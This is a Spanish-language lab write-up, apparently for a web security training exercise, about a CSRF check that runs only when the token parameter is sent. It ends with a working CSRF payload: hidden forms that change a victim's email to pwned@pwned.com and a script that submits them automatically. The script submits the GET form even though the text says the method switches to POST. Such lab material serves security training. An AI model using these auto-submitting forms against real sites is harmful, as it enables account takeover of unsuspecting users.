En esta clase nos enfrentamos a un escenario de validación condicional del token CSRF, donde la protección solo entra en juego si el parámetro csrf está incluido en la solicitud.

Mediante el análisis de las respuestas del servidor en Burp Suite, observamos que cuando el token es incorrecto, la solicitud es rechazada, pero si directamente eliminamos el parámetro, la validación desaparece y la operación se ejecuta correctamente.

Aprovechamos este fallo lógico para construir un ataque CSRF que omite por completo el campo csrf, lo cual permite modificar la dirección de correo electrónico del usuario víctima sin necesidad de conocer ni manipular un token válido.

Este caso demuestra un error de implementación típico: asumir que la ausencia de un token equivale a una solicitud segura, dejando expuesta la aplicación ante ataques triviales.

Solucion
Basicamente se aplica lo mismo solo que cambiamos de GET a POST
<form class="login-form" name="change-email-form" action="https://0a4d00880366100380e603ee00cb0090.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="email" value="pwned@pwned.com">
</form>

<form class="login-form" name="change-email-form" action="https://0aa0000a030520418001c13b008a008e.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
</form>

<script>
        document.forms[0].submit();
</script>
